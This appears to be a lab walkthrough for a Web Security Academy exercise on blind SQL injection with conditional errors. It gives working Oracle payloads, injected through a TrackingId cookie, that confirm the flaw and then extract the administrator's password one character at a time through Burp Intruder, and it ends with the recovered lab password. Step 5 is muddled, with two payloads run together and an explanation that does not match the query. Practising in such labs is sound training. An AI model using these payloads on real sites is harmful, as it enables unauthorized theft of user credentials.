
## Blind SQL injection with conditional errors

1. main url : product category==>

https://0a8800d103869ee68003081a00f8006e.web-security-academy.net/filter?category=Pets

2. 2. go firefox  which is connected to burp suite and and open the burp suite than go the proxy ,trun on intercept and intercept the request and select the request with tracking id and send it to repeater and then send the request to the server

TrackingId=wNmyvxvGJPPxQc0r;

3. 3. now modify the request in repeater and add the following payload to the tracking id parameter to check if the query is true or false:

TrackingId=wNmyvxvGJPPxQc0r' And (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a;
>> this  input it evaluates to 1/0, which causes a divide-by-zero error. show an error message in the response.this query is true then the server will respond with 'Internal Server Error'  message and if it is false then the server will not show the 'Internal Server Error' message.

ii. TrackingId=wNmyvxvGJPPxQc0r' And (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a; 
 >> in this input, the CASE expression evaluates to 'a', which does not cause any error.
 this query is false then the server will not show the 'Internal Server Error' message.


4. Now we can use this technique to check the length of the password for the administrator user. We can use the following payload to check if the length of the password :

TrackingId=IAaf9PNPF6WbcGb6'And(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users where username='administrator')='a;
if the length of the password is greater than 1, then the query will evaluate to true and cause a divide-by-zero error, resulting in an 'Internal Server Error' message. If it is less than or equal to 1, then the query will evaluate to false and not cause an error.


5.  TrackingId=IAaf9PNPF6WbcGb6' And (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a;
AND (SELECT CASE WHEN (Username = 'administrator' AND SUBSTR(Password, 1, 1) = 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
check the first character of the password for the administrator user. If the first character is  'm', then the query will evaluate to true and cause a divide-by-zero error, resulting in an 'Internal Server Error' message. If it is less than or equal to 'm', then the query will evaluate to false and not cause an error.

6. after getting the first character of the password, we can use indruder to automate the process of checking the remaining characters of the password. We can use the following payload to check the second character of the password:

 TrackingId=IAaf9PNPF6WbcGb6'And(SELECT CASE WHEN (SUBSTR(password,$1$,1)='$m$') THEN TO_CHAR(1/0) ELSE 'a' END FROM users where username='administrator')='a

password = m05sc15f5fvanr8h3wt9